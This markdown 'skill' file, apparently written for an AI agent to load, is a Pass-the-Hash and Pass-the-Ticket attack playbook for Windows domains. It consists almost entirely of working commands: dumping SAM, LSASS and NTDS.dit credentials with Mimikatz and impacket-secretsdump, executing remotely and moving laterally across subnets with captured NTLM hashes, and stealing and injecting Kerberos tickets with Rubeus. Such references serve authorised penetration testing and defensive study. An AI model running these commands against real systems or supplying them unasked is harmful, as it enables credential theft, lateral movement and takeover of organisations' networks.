---
name: pass-the-hash
description: Pass-the-Hash (PtH) and Pass-the-Ticket (PtT) attack methodology for Windows environments. Covers hash extraction, lateral movement, credential reuse, and over-pass-the-hash (PTK).
version: 1.0.0
license: Apache-2.0
---

# Pass-the-Hash / Pass-the-Ticket

## Hash Extraction

**From local SAM (requires SYSTEM):**
```bash
# Impacket
impacket-secretsdump LOCAL -sam SAM -system SYSTEM

# Mimikatz (on Windows)
privilege::debug
lsadump::sam
```

**From LSASS memory:**
```powershell
# Mimikatz
privilege::debug
sekurlsa::logonpasswords

# Remote (if admin on target)
impacket-secretsdump domain/user:password@target_ip
```

**From NTDS.dit (Domain Controller — DCSync):**
```bash
impacket-secretsdump -just-dc domain/user:password@dc-ip
```

## Pass-the-Hash (PtH)

Use NTLM hash instead of plaintext password:

```bash
# Impacket — SMB exec
impacket-psexec -hashes :NTLM_HASH domain/administrator@target_ip

# Impacket — WMI exec
impacket-wmiexec -hashes :NTLM_HASH domain/administrator@target_ip

# Impacket — SMB with hash
impacket-smbclient -hashes :NTLM_HASH domain/user@target_ip

# CrackMapExec — bulk lateral movement
crackmapexec smb 10.0.0.0/24 -u administrator -H NTLM_HASH
crackmapexec smb 10.0.0.0/24 -u administrator -H NTLM_HASH --local-auth
```

**Mimikatz PtH:**
```
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd.exe
```

## Pass-the-Ticket (PtT) — Kerberos

```bash
# Extract Kerberos tickets
Rubeus.exe dump /nowrap

# Export to file
mimikatz: sekurlsa::tickets /export

# Import ticket
Rubeus.exe ptt /ticket:BASE64_TICKET
mimikatz: kerberos::ptt ticket.kirbi

# Verify
klist
```

## Over-Pass-the-Hash (OPTH) — Convert NTLM to TGT

```bash
# Rubeus
Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt

# Mimikatz
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH
# → opens cmd.exe with Kerberos ticket
```

## Tools

- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) / [NetExec](https://github.com/Pennyw0rth/NetExec)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- Mimikatz

## MITRE ATT&CK

- T1550.002 — Use Alternate Authentication Material: Pass the Hash
- T1550.003 — Use Alternate Authentication Material: Pass the Ticket
